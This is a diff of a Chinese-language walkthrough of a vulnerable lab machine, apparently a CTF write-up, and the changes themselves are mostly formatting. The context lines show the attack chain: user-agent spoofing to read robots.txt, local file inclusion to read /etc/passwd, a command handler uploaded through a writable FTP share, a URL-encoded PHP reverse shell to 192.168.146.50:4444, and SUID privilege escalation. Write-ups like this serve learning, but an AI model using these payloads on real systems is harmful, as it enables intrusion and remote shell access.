@@ -99,16 +99,21 @@ ftp> exit
 
 ![Img](../FILES/inclusiveness/img-20220814193612.png)
 但是返回告诉我们不是搜索引擎, 那我们就构造一个搜索引擎的ua
+<br>
+
 ```
 curl -s --user-agent Googlebot http://192.168.146.57/robots.txt   
 ```
 ![Img](../FILES/inclusiveness/img-20220814193752.png)
+<br>
 这里看到一个Disallow的目录
 <br>
 ![Img](../FILES/inclusiveness/img-20220814193827.png)
 访问之后当我们切换语言的时候, 会发现后面多了个lang=en.php, 尝试fuzz
 ![Img](../FILES/inclusiveness/img-20220814194154.png)
+<br>
 发现确实存在LFI, 直接访问/etc/passwd
+<br>
 ![Img](../FILES/inclusiveness/img-20220814194223.png)
 还记得刚开始的时候ftp是可以写入的, 那我们在就本地写一个能够接受cmd的系统函数给靶机
 ![Img](../FILES/inclusiveness/img-20220814194443.png)
@@ -125,13 +130,17 @@ curl -s --user-agent Googlebot http://192.168.146.57/robots.txt
 php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.146.50%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27
 ```
 ![Img](../FILES/inclusiveness/img-20220814194920.png)
+<br>
 获取到www-data的权限
 <br>
 查看是否有文件具有suid的权限
 ![Img](../FILES/inclusiveness/img-20220814195112.png)
+<br>
 来到这个目录下, 查看到一个rootshell.c的文件, 通过gcc生成了rootshell
+<br>
 ![Img](../FILES/inclusiveness/img-20220814195311.png)
 ![Img](../FILES/inclusiveness/img-20220814195433.png)
+<br>
 解读一下这行代码:    
 <br>
 如果文件以Tomcat的身份通过调用whoami的函数进行了身份认证之后, 可以直接提升权限, 否则将会直接打印当前的用户
